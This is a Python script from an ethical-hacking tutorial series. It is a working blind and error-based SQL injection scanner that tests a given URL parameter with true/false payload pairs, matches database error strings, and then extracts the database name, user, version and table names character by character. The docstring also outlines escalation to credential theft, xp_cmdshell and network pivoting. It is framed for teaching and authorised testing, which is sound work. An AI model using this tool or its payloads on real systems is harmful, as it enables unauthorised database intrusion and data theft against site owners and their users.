#!/usr/bin/env python3
"""
============================================================
  PROJECT #9 — SQL Injection Scanner (Boolean-Based)
  100 Ethical Hacking Projects Series
  Lib     : requests
  Methods : boolean-based blind, error-based detection
  Extract : database name via binary search (char by char)
============================================================

  ╔══════════════════════════════════════════════════════╗
  ║          ⚠  ETHICAL USE WARNING  ⚠                  ║
  ║  Use ONLY on targets you own or have explicit        ║
  ║  written authorisation to test.                      ║
  ║  Legal targets:                                      ║
  ║    • testphp.vulnweb.com  (Acunetix intentional)     ║
  ║    • HackTheBox / TryHackMe machines                 ║
  ║    • Your own lab (DVWA, WebGoat, SQLi-labs)         ║
  ╚══════════════════════════════════════════════════════╝

HOW BOOLEAN-BASED BLIND SQLi WORKS
-------------------------------------
The app queries: SELECT * FROM artists WHERE id = [INPUT]
We inject:
  TRUE  payload: 1 AND 1=1  → query succeeds → full page
  FALSE payload: 1 AND 1=2  → query fails   → empty/diff page

If TRUE response ≠ FALSE response → parameter is injectable.

To extract data character-by-character, we ask yes/no questions:
  "Is the 1st char of DATABASE() > 'm'?"
  → 1 AND ASCII(SUBSTRING(DATABASE(),1,1)) > 109
  Binary search narrows down ASCII value in ~7 requests per char.

REAL-WORLD USE CASE
---------------------
During a web app pentest, automated scanners (sqlmap, this
script) confirm injectable parameters quickly. The pentester
then escalates: extract credentials from users table, attempt
OS command execution via INTO OUTFILE or xp_cmdshell, pivot
to internal network. Report finding = Critical severity with
CVSS 9.8 — immediate patch required.

DEFENSE AGAINST SQL INJECTION
--------------------------------
1. PARAMETERIZED QUERIES (prepared statements) — the only
   real fix. PHP: $stmt = $pdo->prepare("SELECT * FROM t WHERE id=?");
2. ORM frameworks (SQLAlchemy, Django ORM) — auto-escape by default.
3. WAF (ModSecurity, Cloudflare) — blocks known SQLi patterns.
4. Least-privilege DB user — read-only user can't DROP or write files.
5. Error handling — never expose raw DB error messages to users.

USAGE
------
  python3 project9_sqli_scanner.py --url "http://testphp.vulnweb.com/artists.php?artist=1"
  python3 project9_sqli_scanner.py --url "http://target/page.php?id=1" --param id
  python3 project9_sqli_scanner.py --url "http://target/page.php?id=1" --extract-tables
  python3 project9_sqli_scanner.py --url "http://target/page.php?id=1" --no-extract
============================================================
"""

import argparse
import sys
import time
import re
import string
import urllib.parse
import requests
from requests.exceptions import RequestException

# ── colours ───────────────────────────────────────────────
R="\033[0m";BOLD="\033[1m";RED="\033[91m";GREEN="\033[92m"
YELLOW="\033[93m";CYAN="\033[96m";MAGENTA="\033[95m";DIM="\033[2m"
def c(t, code): return f"{code}{t}{R}"

# ── request delay ─────────────────────────────────────────
DELAY = 0.5   # seconds between requests (polite scanning)

# ─────────────────────────────────────────────────────────
# BOOLEAN PAYLOADS — TRUE and FALSE conditions
# ─────────────────────────────────────────────────────────
BOOLEAN_PAIRS = [
    # classic quotes
    ("1 AND 1=1",      "1 AND 1=2"),
    ("1 AND 'a'='a",   "1 AND 'a'='b"),
    # comment styles
    ("1 AND 1=1--",    "1 AND 1=2--"),
    ("1 AND 1=1#",     "1 AND 1=2#"),
    ("1 AND 1=1 /*",   "1 AND 1=2 /*"),
    # quoted integer
    ("1' AND '1'='1",  "1' AND '1'='2"),
    ("1' AND '1'='1'--","1' AND '1'='2'--"),
    # SLEEP-free time-independent booleans
    ("1 OR 1=1",       "1 OR 1=2"),
]

# ── error-based detection patterns ────────────────────────
ERROR_PATTERNS = [
    r"SQL syntax",
    r"mysql_fetch",
    r"ORA-\d{5}",
    r"Microsoft OLE DB",
    r"ODBC SQL Server",
    r"Unclosed quotation",
    r"quoted string not properly terminated",
    r"PostgreSQL.*ERROR",
    r"Warning.*mysql",
    r"mysqli?_",
    r"SqlException",
    r"syntax error.*query",
    r"\[Microsoft\]\[ODBC",
    r"supplied argument is not a valid MySQL",
    r"You have an error in your SQL",
]
ERROR_RE = re.compile("|".join(ERROR_PATTERNS), re.IGNORECASE)

# ─────────────────────────────────────────────────────────
# HTTP HELPER
# ─────────────────────────────────────────────────────────
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (compatible; EthicalScanner/1.0; educational)",
})

req_count = [0]
last_fetch_error = [None]

def fetch(url: str, params: dict, timeout: float = 10.0):
    """GET request with built-in delay and counter."""
    time.sleep(DELAY)
    req_count[0] += 1
    try:
        resp = session.get(url, params=params, timeout=timeout, allow_redirects=True)
        last_fetch_error[0] = None
        return resp
    except RequestException as e:
        last_fetch_error[0] = f"{type(e).__name__}: {e}"
        return None

# ─────────────────────────────────────────────────────────
# URL PARSER — split base URL from parameters
# ─────────────────────────────────────────────────────────
def parse_target(raw_url: str) -> tuple[str, dict, str]:
    """
    Returns (base_url, params_dict, injectable_param).
    Picks the first numeric parameter as the injection point.
    """
    parsed = urllib.parse.urlparse(raw_url)
    base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = dict(urllib.parse.parse_qsl(parsed.query))

    # prefer explicitly numeric param
    inject_param = None
    for k, v in params.items():
        if v.lstrip("-").isdigit():
            inject_param = k
            break
    if inject_param is None and params:
        inject_param = list(params.keys())[0]

    return base, params, inject_param

# ─────────────────────────────────────────────────────────
# BASELINE REQUEST
# ─────────────────────────────────────────────────────────
def get_baseline(base_url: str, params: dict) -> dict:
    """Fetch the normal page and record metrics."""
    resp = fetch(base_url, params)
    if resp is None:
        print(c("  [ERROR] Target unreachable.", RED))
        if last_fetch_error[0]:
            print(c(f"  Cause: {last_fetch_error[0]}", YELLOW))
        print(c("  Tip: try another legal target or run against a local lab (DVWA / SQLi-Labs).", DIM))
        print(c("  Tip: verify connectivity with curl/wget from the same terminal.", DIM))
        sys.exit(1)

    return {
        "status" : resp.status_code,
        "length" : len(resp.text),
        "text"   : resp.text,
    }

# ─────────────────────────────────────────────────────────
# ERROR-BASED DETECTION
# ─────────────────────────────────────────────────────────
def check_error_based(base_url: str, params: dict, param: str) -> bool:
    """
    Send a broken quote to provoke a DB error.
    If the error string appears in response → error-based SQLi confirmed.
    """
    test_params = dict(params)
    test_params[param] = params[param] + "'"
    resp = fetch(base_url, test_params)
    if resp and ERROR_RE.search(resp.text):
        return True
    return False

# ─────────────────────────────────────────────────────────
# BOOLEAN-BASED DETECTION
# ─────────────────────────────────────────────────────────
def detect_boolean(base_url: str, params: dict, param: str,
                   baseline: dict) -> tuple[bool, str, str] | tuple[bool, None, None]:
    """
    Try each TRUE/FALSE payload pair.
    Returns (vulnerable, true_payload, false_payload) or (False, None, None).
    """
    orig_val = params[param]

    for true_pay, false_pay in BOOLEAN_PAIRS:
        tp = dict(params); tp[param] = true_pay
        fp = dict(params); fp[param] = false_pay

        r_true  = fetch(base_url, tp)
        r_false = fetch(base_url, fp)

        if r_true is None or r_false is None:
            continue

        len_true  = len(r_true.text)
        len_false = len(r_false.text)
        len_base  = baseline["length"]

        # condition: true response ≈ baseline AND false differs significantly
        diff_tf = abs(len_true - len_false)
        diff_tb = abs(len_true - len_base)

        if diff_tf > 10 and diff_tb < 50:
            return True, true_pay, false_pay

        # also check: both differ from baseline (different error vs content page)
        if diff_tf > 20:
            return True, true_pay, false_pay

    return False, None, None

# ─────────────────────────────────────────────────────────
# BINARY SEARCH — extract one character's ASCII value
# ─────────────────────────────────────────────────────────
def extract_char(base_url: str, params: dict, param: str,
                 expr: str, pos: int,
                 true_payload_template: str) -> str | None:
    """
    Binary search ASCII value of char at position `pos` in SQL expression `expr`.
    true_payload_template uses {condition} as placeholder.
    E.g. expr = "DATABASE()"
    Queries: ASCII(SUBSTRING({expr},{pos},1)) > {mid}
    Returns the character, or None if extraction failed.
    """
    lo, hi = 32, 126    # printable ASCII range

    while lo < hi:
        mid = (lo + hi) // 2
        condition = f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"
        payload   = true_payload_template.replace("{CONDITION}", condition)

        test_params = dict(params)
        test_params[param] = payload

        resp = fetch(base_url, test_params)
        if resp is None:
            return None

        # check whether TRUE branch fired (page has content / matches baseline)
        # heuristic: longer response = TRUE condition
        is_true = len(resp.text) > 100   # non-empty page = condition true

        if is_true:
            lo = mid + 1
        else:
            hi = mid

    if lo == 32:
        return None   # no printable character found
    return chr(lo)

# ─────────────────────────────────────────────────────────
# EXTRACT STRING — run extract_char over all positions
# ─────────────────────────────────────────────────────────
def extract_string(base_url: str, params: dict, param: str,
                   expr: str, max_len: int,
                   true_payload_template: str,
                   label: str) -> str:
    """Extract up to max_len characters of SQL expression expr."""
    result = ""
    print(f"\n  {c('Extracting:', DIM)} {c(label, CYAN)}  "
          f"(up to {max_len} chars, ~7 requests/char)")
    print(f"  {c('Chars:', DIM)} ", end="", flush=True)

    for pos in range(1, max_len + 1):
        ch = extract_char(base_url, params, param, expr, pos,
                          true_payload_template)
        if ch is None or ch == chr(32):
            break
        result += ch
        print(c(ch, GREEN), end="", flush=True)

    print()
    return result

# ─────────────────────────────────────────────────────────
# BUILD TRUE-PAYLOAD TEMPLATE
# ─────────────────────────────────────────────────────────
def make_template(true_payload: str, param_value: str) -> str:
    """
    Convert a working true payload into a template for binary extraction.
    We replace the boolean condition with {CONDITION}.

    e.g. true_payload = "1 AND 1=1"
    template = "1 AND {CONDITION}"
    """
    # Most boolean payloads end with a condition like X=Y — replace last part
    for suffix in ["AND 1=1--", "AND 1=1#", "AND 1=1 /*", "AND 1=1",
                   "AND 'a'='a", "AND '1'='1", "OR 1=1"]:
        if true_payload.endswith(suffix):
            base = true_payload[:-len(suffix)]
            return base + "AND {CONDITION}"

    # fallback: just append
    return f"1 AND {{CONDITION}}"

# ─────────────────────────────────────────────────────────
# MAIN SCAN
# ─────────────────────────────────────────────────────────
def scan(raw_url: str, forced_param: str | None,
         do_extract: bool, extract_tables: bool):

    base_url, params, inject_param = parse_target(raw_url)
    if forced_param:
        inject_param = forced_param

    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", CYAN))
    print(c("  ║   PROJECT #9 · SQL INJECTION SCANNER                 ║", CYAN))
    print(c("  ║   Boolean-Based Blind + Error-Based Detection         ║", CYAN))
    print(c("  ╚══════════════════════════════════════════════════════╝", CYAN))
    print()
    print(c("  ⚠  Authorised targets only.", RED))
    print()
    print(f"  Target    : {c(raw_url, YELLOW)}")
    print(f"  Base URL  : {c(base_url, YELLOW)}")
    print(f"  Params    : {c(str(params), MAGENTA)}")
    print(f"  Inject    : {c(inject_param, GREEN+BOLD)}")
    print(f"  Delay     : {DELAY}s between requests")

    if inject_param is None:
        print(c("\n  [ERROR] No injectable parameter detected in URL.", RED))
        sys.exit(1)

    # ── baseline ──────────────────────────────────────────
    print(c(f"\n  ── BASELINE ─────────────────────────────────────────────", CYAN))
    baseline = get_baseline(base_url, params)
    print(f"  Status : {c(str(baseline['status']), GREEN)}")
    print(f"  Length : {c(str(baseline['length']) + ' bytes', MAGENTA)}")

    # ── error-based detection ─────────────────────────────
    print(c(f"\n  ── ERROR-BASED DETECTION ────────────────────────────────", CYAN))
    err_vuln = check_error_based(base_url, params, inject_param)
    if err_vuln:
        print(c("  ✔ ERROR-BASED SQLi DETECTED — DB error exposed in response!", RED+BOLD))
    else:
        print(c("  ✗ No raw DB errors visible (good hardening or WAF present).", DIM))

    # ── boolean-based detection ───────────────────────────
    print(c(f"\n  ── BOOLEAN-BASED DETECTION ──────────────────────────────", CYAN))
    print(f"  Testing {len(BOOLEAN_PAIRS)} payload pairs …")

    for i, (tp, fp) in enumerate(BOOLEAN_PAIRS, 1):
        test_p  = dict(params); test_p[inject_param]  = tp
        test_f  = dict(params); test_f[inject_param]  = fp
        rt = fetch(base_url, test_p)
        rf = fetch(base_url, test_f)
        if rt and rf:
            diff = abs(len(rt.text) - len(rf.text))
            icon = c("≠", GREEN) if diff > 10 else c("=", DIM)
            print(f"  Pair {i:>2}: TRUE={c(str(len(rt.text))+'B', CYAN)} "
                  f"FALSE={c(str(len(rf.text))+'B', YELLOW)}  Δ={c(str(diff)+'B', GREEN if diff>10 else DIM)}  {icon}")

    bool_vuln, true_pay, false_pay = detect_boolean(
        base_url, params, inject_param, baseline)

    if bool_vuln:
        print(c(f"\n  ✔ BOOLEAN-BASED SQLi CONFIRMED!", GREEN+BOLD))
        print(f"  TRUE  payload : {c(true_pay, GREEN)}")
        print(f"  FALSE payload : {c(false_pay, RED)}")
    else:
        print(c("\n  No boolean difference detected with built-in payloads.", YELLOW))
        print(c("  Parameter may still be vulnerable — try manual testing.", DIM))

    if not (bool_vuln or err_vuln):
        print(c("\n  Scan complete — no automated SQLi detected in this run.", YELLOW))
        return

    # ── extraction phase ──────────────────────────────────
    if not do_extract:
        print(c("\n  Extraction skipped (--no-extract).", DIM))
        return

    # build injection template from working true payload
    template = make_template(true_pay or "1 AND 1=1",
                             params[inject_param])
    print(c(f"\n  ── DATA EXTRACTION ──────────────────────────────────────", CYAN))
    print(f"  Injection template: {c(template.replace('{CONDITION}','<COND>'), MAGENTA)}")
    print(f"  Binary search: ~7 HTTP requests per character")

    # database name
    db_name = extract_string(
        base_url, params, inject_param,
        expr     = "DATABASE()",
        max_len  = 20,
        true_payload_template = template,
        label    = "DATABASE()",
    )
    if db_name:
        print(c(f"\n  ✔ Database name: {db_name}", GREEN+BOLD))
    else:
        print(c("\n  Could not extract database name with binary search.", YELLOW))
        print(c("  This can happen if the injectable column isn't reflected in page length.", DIM))
        print(c("  Try: --no-extract and use sqlmap for deeper extraction.", DIM))

    # current user
    db_user = extract_string(
        base_url, params, inject_param,
        expr     = "USER()",
        max_len  = 20,
        true_payload_template = template,
        label    = "USER()",
    )
    if db_user:
        print(c(f"  ✔ Current user  : {db_user}", GREEN))

    # database version (first 10 chars)
    db_ver = extract_string(
        base_url, params, inject_param,
        expr     = "VERSION()",
        max_len  = 10,
        true_payload_template = template,
        label    = "VERSION()",
    )
    if db_ver:
        print(c(f"  ✔ DB version    : {db_ver}…", GREEN))

    # optional: table names from information_schema
    if extract_tables:
        print(c(f"\n  ── TABLE ENUMERATION ────────────────────────────────────", CYAN))
        for tbl_idx in range(1, 6):
            tbl = extract_string(
                base_url, params, inject_param,
                expr    = (f"SELECT table_name FROM information_schema.tables "
                           f"WHERE table_schema=DATABASE() LIMIT {tbl_idx-1},1"),
                max_len = 20,
                true_payload_template = template,
                label   = f"table #{tbl_idx}",
            )
            if not tbl:
                break
            print(c(f"  ✔ Table {tbl_idx}: {tbl}", CYAN))

    # ── summary ───────────────────────────────────────────
    print(c(f"\n  ── SUMMARY ────────────────────────────────────────────────", CYAN))
    print(f"  Total HTTP requests : {c(str(req_count[0]), YELLOW)}")
    print(f"  Error-based SQLi    : {c('CONFIRMED', GREEN) if err_vuln else c('not detected', DIM)}")
    print(f"  Boolean-based SQLi  : {c('CONFIRMED', GREEN) if bool_vuln else c('not detected', DIM)}")
    if db_name: print(f"  Database name       : {c(db_name, GREEN+BOLD)}")
    if db_user: print(f"  Current user        : {c(db_user, GREEN)}")
    if db_ver:  print(f"  DB version          : {c(db_ver+'...', GREEN)}")
    print()


# ─────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Project #9 — Boolean-Based SQL Injection Scanner")
    parser.add_argument("--url",          required=True,
                        help="Target URL with parameter, e.g. http://host/page.php?id=1")
    parser.add_argument("--param",        default=None,
                        help="Parameter to inject (auto-detected if omitted)")
    parser.add_argument("--no-extract",   action="store_true",
                        help="Skip data extraction (detection only)")
    parser.add_argument("--extract-tables", action="store_true",
                        help="Also enumerate table names from information_schema")
    parser.add_argument("--delay",        type=float, default=0.5,
                        help="Delay between requests in seconds (default: 0.5)")
    args = parser.parse_args()

    global DELAY
    DELAY = args.delay

    scan(
        raw_url        = args.url,
        forced_param   = args.param,
        do_extract     = not args.no_extract,
        extract_tables = args.extract_tables,
    )


if __name__ == "__main__":
    main()